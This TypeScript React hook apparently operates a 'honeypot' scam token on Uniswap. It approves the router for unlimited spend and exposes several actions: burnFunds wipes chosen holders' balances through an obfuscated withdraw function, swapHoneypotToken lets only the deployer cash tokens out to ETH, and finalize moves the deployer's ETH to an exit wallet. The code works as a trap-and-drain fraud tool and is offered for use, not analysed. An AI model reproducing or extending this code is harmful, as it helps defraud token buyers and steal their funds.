import * as React from 'react';
import {ethers, HDNodeWallet, JsonRpcProvider} from 'ethers';

import UniswapUniversalRouterAbi from '../../../abi/UniswapUniversalRouter.json';
import UniswapV2RouterAbi from '../../../abi/UniswapV2Router.json';
import UniswapV2FactoryAbi from '../../../abi/UniswapV2Factory.json';

import {Resumable} from '../../@types';
import {getAddressesOrThrow} from '../../constants';
import {
  getPairDetails,
  honeypotSwapETHToHoneypotToken,
  honeypotSwapHoneypotTokenToETH,
} from '../../contracts';
import {logger} from '../../logger';

import {HoneypotContractState} from '../@types';
import {
  blockOnBalance,
  blockOnDeployment,
  calculateTransactionFee,
  createDeadline,
  delayAsync,
} from '../utils';

const loading = (message: string): () => HoneypotContractState => () => ({
  loading: true,
  message,
});

const defaultLoading = loading('Initializing...');

export function useCreateHoneypot({
  exitWallet,
  resumable,
  honeypotDeployer,
  provider,
}: {
  readonly exitWallet: HDNodeWallet;
  readonly resumable: Resumable;
  readonly honeypotDeployer: HDNodeWallet;
  readonly provider: JsonRpcProvider;
}): HoneypotContractState {
  const [state, setState] = React.useState<HoneypotContractState>(defaultLoading);

  React.useEffect(() => void (async () => {
    try {

      const {
        honeypotContractAddress,
        abi,
        honeypotContractProps,
      } = resumable;

      setState(loading('Ensuring Honeypot contract exists...'));

      await blockOnDeployment({provider, address: honeypotContractAddress});

      setState(loading('Asserting non-zero deployer balance...'));

      await blockOnBalance({provider, address: await honeypotDeployer.getAddress()});

      setState(loading('Verified non-zero deployer balance...'));
 
      const getHoneypotContract = (signer: ethers.Signer) => new ethers.Contract(
        honeypotContractAddress,
        abi,
        signer
      );

      const {
        UNISWAP_FACTORY_V2,
        UNISWAP_ROUTER_V2,
        UNISWAP_UNIVERSAL_ROUTER,
      } = getAddressesOrThrow();

      const getUniversalRouter = (signer: ethers.Signer) => new ethers.Contract(
        UNISWAP_UNIVERSAL_ROUTER,
        UniswapUniversalRouterAbi,
        signer
      );

      const getRouterV2 = (signer: ethers.Signer) => new ethers.Contract(
        UNISWAP_ROUTER_V2,
        UniswapV2RouterAbi,
        signer
      );

      const getFactory = (signer: ethers.Signer) => new ethers.Contract(
        UNISWAP_FACTORY_V2,
        UniswapV2FactoryAbi,
        signer
      );

      const burnFunds = async (addressesToBurn: readonly string[]): Promise<true> => {
        // Fetch the dynamic obfuscated function for withdrawing from the contract.
        const {functionToWithdrawVariable} = honeypotContractProps;
        // Use the honeypot as the deployer (only the deployer may burn).
        const honeypot = getHoneypotContract(honeypotDeployer);
        // Okay, try to burn funds.
        await (await honeypot[functionToWithdrawVariable]!(addressesToBurn)).wait();
        // Assert we were successful.
        return true;
      };

      const swapEth = async (amountOfETHToSwap: bigint, signer: ethers.Signer) => {

        // Compute the amount out.
        const {getHoneypotPairContract} = await getPairDetails({
          getFactory,
          honeypotDeployer,
          honeypotContractAddress,
        });
        
        return honeypotSwapETHToHoneypotToken({
          routerV2: getRouterV2(signer),
          honeypotPairContract: getHoneypotPairContract(signer),
          honeypotContractAddress,
          amountOfETHToSwap,
          deadline: await createDeadline({provider}),
          universalRouter: getUniversalRouter(signer),
        });
      };

      const swapHoneypotToken = async (amountOfHoneypotTokensToSwap: bigint, signer: ethers.Signer) => {

        // TODO: make sure the caller has approved the v2 router before attempting swap! (actors)

        const address = await signer.getAddress();

        // TODO: we need to determine this dynamically to prevent accidents when using actors
        if (address !== honeypotDeployer.address)
          throw new Error(`swapHoneypotToken may only be called by the deployer!`);

        logger.info(`Did call swapHoneypotToken with ${amountOfHoneypotTokensToSwap}.`);

        const recipient = honeypotDeployer.address;

        const recipientBalanceBeforeSwap = await provider.getBalance(recipient);

        // Compute the amount out.
        const {getHoneypotPairContract} = await getPairDetails({
          getFactory,
          honeypotDeployer,
          honeypotContractAddress,
        });

        const {amountOutMinETH} = await honeypotSwapHoneypotTokenToETH({
          honeypotContractAddress,
          honeypotPairContract: getHoneypotPairContract(signer),
          amountOfHoneypotTokensToSwap,
          deadline: await createDeadline({provider}),
          routerV2: getRouterV2(signer),
          recipient,
        });

        const recipientBalanceAfterSwap = await provider.getBalance(recipient);

        logger.info(`(RecipientETHBalanceBeforeSwap: ${
          recipientBalanceBeforeSwap
        }, RecipientETHBalanceAfterSwap: ${
          recipientBalanceAfterSwap
        }, Delta: ${
          recipientBalanceAfterSwap - recipientBalanceBeforeSwap
        })`);

        return {amountOutMinETH};
      };
      
      const finalize = async (): Promise<true> => {

        const deployerBalance = await provider.getBalance(honeypotDeployer.address);

        const gasLimit = await honeypotDeployer.estimateGas({
          value: deployerBalance,
          to: exitWallet.address,
        });

        const {maxFeePerGas} = await provider.getFeeData();

        if (maxFeePerGas === null) throw new Error('Unable to determine maxFeePerGas.');

        const transactionFee = calculateTransactionFee({
          maxFeePerGas,
          gasLimit,
        }) /* worst case */;

        logger.info(`Estimated finalize() gasLimit is ${gasLimit}, and total transactionFee is ${transactionFee}.`);

        await (await honeypotDeployer.sendTransaction({
          // HACK: To ensure success, assume the withdraw transaction costs twice as much.
          value: deployerBalance - (transactionFee * 2n),
          to: exitWallet.address,
        })).wait();

        return true;
      };

      setState(loading('Approving router...'));

      await delayAsync();

      // TODO: note this used to be initialHoneypotBalance
      // HACK: here we ensure the router approves all spends for the deployer, actors will need to do the same
      await (await getHoneypotContract(honeypotDeployer).approve!(UNISWAP_ROUTER_V2, ethers.MaxUint256)).wait();

      setState(loading('Approved UniswapRouterV2 for the full spend amount!'));

      await delayAsync();

      console.clear();

      setState({
        loading: false,
        result: {
          abi,
          /* thunks */
          getHoneypotContract,
          getUniversalRouter,
          getRouterV2,
          getFactory,
          /* actions */
          burnFunds,
          swapEth,
          swapHoneypotToken,
          finalize,
        },
      });

    } catch (cause) {
      setState({loading: false, error: new Error('Failed to create honeypot.', {cause})});
    }

  })(), [resumable, honeypotDeployer, provider, exitWallet]);

  return state;
}
